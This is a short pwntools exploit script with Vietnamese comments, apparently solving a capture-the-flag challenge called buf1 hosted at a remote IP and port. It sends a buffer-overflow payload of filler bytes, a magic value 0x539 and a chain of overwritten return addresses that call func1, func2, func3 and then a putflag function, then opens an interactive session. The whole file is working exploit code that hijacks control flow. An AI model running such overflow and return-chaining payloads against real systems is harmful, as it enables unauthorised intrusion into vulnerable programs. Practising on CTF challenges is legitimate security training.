from pwn import * # Thêm các đối tượng
 # sh = process('./buf1')
 # 45.122.249.68 10008 
sh = remote("45.122.249.68", 10008) 
# raw_input(">>") 
putflag_address = 0x00000000004011EA #ham putflag 
func1 = 0x0000000000401172 
func2 = 0x000000000040119A 
func3 = 0x00000000004011C2 #1337 int = 539 hex 
# func1 ->func2 ->func3 ->putflag #
# payload # 
payload = b'a' * 20 + p32(0x539) + (p64(func1))+ (p64(func2))+ (p64(func3))+p64(putflag_address) #
# gửi payload đến đối tượng #
print(payload) 
sh.sendline(payload) 
sh.interactive()
